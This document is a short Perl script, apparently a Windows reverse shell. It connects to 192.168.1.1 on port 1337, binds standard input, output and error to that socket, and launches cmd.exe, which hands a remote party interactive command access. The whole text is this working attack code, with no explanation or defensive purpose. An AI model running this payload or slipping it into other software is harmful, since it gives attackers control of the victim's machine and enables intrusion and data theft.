

````
#!perl -w
use Socket;
$i="192.168.1.1";
$p=1337;
socket (S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))) {
open(STDIN, ">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("cmd.exe");
system("start cmd.exe /k $cmd");
};

````
